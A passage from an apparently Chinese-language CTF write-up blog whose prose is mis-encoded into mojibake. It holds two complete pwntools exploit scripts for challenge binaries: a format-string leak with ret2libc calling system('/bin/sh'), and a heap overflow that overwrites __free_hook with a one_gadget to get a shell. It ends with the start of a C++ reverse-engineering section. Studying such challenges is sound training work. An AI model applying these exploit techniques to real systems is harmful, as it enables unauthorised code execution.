class="number">33185</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;11.0&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;AAAAAAAA%23$p&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">    main_146F = io.recv(<span class="number">10</span>)</span><br><span class="line">    main_addr = <span class="built_in">hex</span>(<span class="built_in">int</span>(main_146F,<span class="number">16</span>) - <span class="number">456</span>)</span><br><span class="line">    log.success(<span class="string">&quot;main_146F = &quot;</span> + <span class="built_in">str</span>(main_146F.decode()))</span><br><span class="line">    log.success(<span class="string">&quot;main_addr = &quot;</span> + <span class="built_in">str</span>(main_addr))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x4c</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    main_addr = <span class="built_in">int</span>(main_addr,<span class="number">16</span>)</span><br><span class="line">    backdoor = main_addr + <span class="number">0x1DDE</span> - <span class="number">0x12A7</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * offset + p32(backdoor)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;7. Exit the system\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    base = main_addr - elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">    puts_plt = base + elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    puts_got = base + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;main_add = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_addr)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_plt = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">    log.success(<span class="string">&quot;elf_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line">    log.success(<span class="string">&quot;puts_got = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_got)))</span><br><span class="line">    </span><br><span class="line">    offset = <span class="number">0x13c</span></span><br><span class="line">    ret = base + <span class="number">0x100e</span></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    global_offset_table_addr = base + <span class="number">0x5000</span><span class="comment">#0x4fa0</span></span><br><span class="line">    log.success(<span class="string">&quot;global_offset_table_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(global_offset_table_addr)))</span><br><span class="line">    payload1 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret) + p32(puts_plt) + p32(backdoor) + p32(puts_got)</span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr)</span></span><br><span class="line">    <span class="comment"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr) </span></span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    log.success(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">    payload2 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret)</span><br><span class="line">    payload2 += p32(system_addr) + p32(binsh_addr) + p32(binsh_addr) + p32(binsh_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œ payload2 çš„ <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  æœ‰ç‚¹å„¿é—®é¢˜ï¼Œä¸æ˜¯æˆ‘çš„ exp çš„é—®é¢˜ï¼Œæ˜¯æˆ‘æœ€å¼€å§‹æœ¬åœ°è°ƒé¢˜ç›®çš„æ—¶å€™å‡ºç°çš„é—®é¢˜ï¼Œæˆ‘å‘ç°å®ƒè¿™é‡Œå¦‚æœä¸æ³„éœ²è¿™ä¸ªåœ°å€çš„è¯å°±æ‰“ä¸é€šï¼Œä½†ä¸ºå•¥ç°åœ¨ä¸éœ€è¦è¿™ä¸ªéƒ½èƒ½å‡ºï¼Œæœ‰ç‚¹è¿‡äºéšç¼˜äº†ï¼Œå¦‚æœä¸åŠ ä¸Šè¿™ä¸ªåœ°å€ä¸é€šçš„è¯ï¼Œ é‚£å°±è€ƒè™‘ gdb è°ƒä¸€ä¸‹çœ‹çœ‹æ˜¯å¦è¿™é‡Œç¼ºå¤±äº†ä»€ä¹ˆï¼Œæˆ–è€…å¯„å­˜å™¨ä¹‹ç±»çš„é—®é¢˜ï¼ˆè¡¥å……ï¼Œè¿™é‡Œå‡ºç°é—®é¢˜æ˜¯å› ä¸ºå† call puts çš„ plt çš„æ—¶å€™ï¼Œå‡ºç°äº†é—®é¢˜ï¼Œæœ‰ä¸ªå­˜åœ¨ ebp-4 çš„åœ°å€ç»™ mov åˆ°äº† ebx å¯„å­˜å™¨ä¸­ï¼ŒåŒæ—¶ï¼Œå­˜åœ¨ jmp ebp+XX ç›¸å…³ä»£ç ï¼ŒåŠ¨è°ƒçš„æ—¶å€™ï¼Œå‘ç°æŠ¥é”™åœ°å€æ˜¯ aaaaï¼Œæ‰€ä»¥æ”¹æˆ <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  å°±èƒ½æ‰“é€šï¼‰ã€‚</p><h3 id="arcaea_sorting_revenge"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge">#</a> Arcaea_Sorting_Revengeï¼š</h3><p>â€‹ä¼¼ä¹å‡ºäº†ä¸ªæ¿å­é¢˜ï¼Œä¸è¿‡ï¼Œæˆ‘ä¹Ÿç®—æ˜¯å°½åŠ›äº†å§ï¼Œå †è¿™ç©æ„å„¿æ˜¯çœŸçš„éš¾ã€‚</p><p>â€‹ç¨‹åºåšäº†ä¸ªç®€å•çš„å­˜å‚¨åŠŸèƒ½ï¼Œarcaea å­˜å‚¨åˆ†æ•°å¹¶è¾“å‡ºçš„åŠŸèƒ½ï¼Œåˆ é™¤åŠŸèƒ½é‡Œä¼šå°† bss æ®µé‡Œçš„å½“å‰æŒ‡é’ˆç½®é›¶ï¼Œä½†æ˜¯æ­Œæ›²ä¿¡æ¯é‚£ä¸ª chunk é‡Œé¢ï¼ŒæŒ‡å‘ description çš„æŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œedit ä¿®æ”¹äº†è¾“å…¥çš„é•¿åº¦ï¼Œä½†æ˜¯æ²¡æœ‰é‡æ–° malloc æ–°çš„ç©ºé—´ï¼Œæ²¡æœ‰æ£€æµ‹å¤§å°ï¼Œå­˜åœ¨å †æº¢å‡ºï¼Œå¢åŠ åŠŸèƒ½é‡Œä¸€æ¬¡ malloc äº†ä¸¤æ¬¡ chunkï¼Œç¬¬äºŒæ¬¡å¯ä»¥æ§åˆ¶å¤§å°ã€‚</p><p>â€‹é¦–å…ˆå¢åŠ ä¸‰æ¬¡ä¹¦ï¼Œæ¯æ¬¡éƒ½æ˜¯ï¼Œæ§åˆ¶ size å¤§å°ä¸º 0x91ï¼Œä¿è¯ chunk åœ¨è¢« free çš„æ—¶å€™èƒ½è¿› unsortedbinï¼Œfree æ‰ç¼–å·ä¸º 1 çš„è¿™ä¸ªéŸ³ä¹ï¼Œç„¶åé‡æ–°å»ºä¸€ä¸ªæ­Œæ›²ï¼Œä¸ºäº†è®© chunk é‡Œæœ‰ unsortedbin é‡Œçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ fd æˆ–è€… bk æŒ‡é’ˆï¼Œå› ä¸º unsortedbin ç›®å‰åªæœ‰ä¸€ä¸ª chunkï¼Œæ‰€ä»¥ fdï¼Œbk æŒ‡é’ˆå‡æŒ‡å‘ main_arenaï¼Œå¯ä»¥ç”¨æ¥ leak æ‰ libc åœ°å€ï¼Œé‡æ–° add äº†ä¸€ä¸ªä¹‹åï¼Œç¼–å·ä¾æ—§ä¸º 1ï¼Œç„¶åå†™å…¥çš„ content ä¸ºå…«ä¸ªå­—èŠ‚ï¼Œä¸è¦å†™å…¥å…¶ä»–å†…å®¹ï¼Œä¹‹å show å¯ä»¥ leak å‡º libc åœ°å€ï¼Œä¹‹åä¸ºäº† leak å †çš„åœ°å€ï¼Œæˆ‘ free äº†ä¸¤æ¬¡ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶ä¸éœ€è¦è¿™ä¹ˆåšï¼Œä¹‹åå°±æ˜¯åˆ©ç”¨ edit çš„æº¢å‡ºåŠŸèƒ½ï¼Œåœ¨å †ä¸Šä¿®æ”¹ chunkï¼Œè¾¾æˆä¼ªé€ ï¼Œä¼ªé€ æŒ‡é’ˆï¼ŒæŒ‡å‘ä»»æ„åœ°å€ï¼Œè¿™é‡ŒæŒ‡å‘ <code>__free_hook</code> ï¼Œç„¶å edit ä¿®æ”¹ <code>__free_hook</code>  ä¸º <code>one_gadget</code>  çš„åœ°å€ï¼Œç„¶åè¿›è¡Œ getshellã€‚</p><p>â€‹ç®—æ˜¯ä¸ªæ¯”è¾ƒæ¿å­çš„å †é¢˜å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;154.64.254.169&quot;,33215)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,rating,score,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,name)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(rating))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input max size you want to change to:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input description:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;plz enter your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;g01den&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;testify&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;hardhard&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;bbbb&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;what&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;cccc&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;nani&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking libc address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[:-6].ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;main_arena =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_arena)))</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;eeee&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;eeeeeeee&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking chunk6 address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line">chunk = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">chunk_basee = chunk - <span class="number">0x210</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk))</span><br><span class="line">log.success(<span class="string">&quot;chunk_basee =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(chunk_basee)))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">target_chunk = chunk_basee + <span class="number">0x210</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x51</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x30</span> + p64(<span class="number">1</span>) + p64(<span class="number">10002221</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šåˆ«é—®ä¸ºå•¥æ²¡æœ‰å‰©ä¸‹ä¸¤ä¸ª pwn é¢˜çš„ wpï¼Œå› ä¸ºæˆ‘ä¹Ÿä¸ä¼šï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…å­¦ä¸ä¼š</strong></p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h2><h3 id="babyre"><a class="markdownIt-Anchor" href="#babyre">#</a> babyreï¼š</h3><p>â€‹æ— å£³ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, <span class="number">0LL</span>, <span class="number">0LL</span>, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ˜¯ Linux ç¼–è¯‘çš„ï¼Œè¿› main é‡Œçœ‹çœ‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE v6[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">40</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v6, a2, a3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v7, a2, v3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v8, a2, v4);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_21AD);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;std::cin, v6);</span><br><span class="line">  <span class="built_in">sub_147E</span>();</span><br><span class="line">  <span class="built_in">sub_1558</span>();</span><br><span class="line">  <span class="built_in">sub_13A9</span>(v8, v6);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(v7, v6);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v6);</span><br><span class="line">  <span class="built_in">sub_1920</span>(v9, v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v7);</span><br><span class="line">  <span class="built_in">sub_17A7</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹C++ é€†å‘ï¼Œä»£ç ä¸å¤æ‚ï¼ŒShift+F12 æ‰¾å…³é”®å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000021BF aWrongValue     db &#x27;Wrong Value&#x27;,0      ; DATA XREF: sub_17A7+110â†‘o</span><br><span class="line">.rodata:00000000000021CB aCurruntValue   db &#x27;Currunt Value&#x27;,0    ; DATA XREF: sub_17A7+149â†‘o</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¸ªä¸€ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨äº†ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_17A7</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  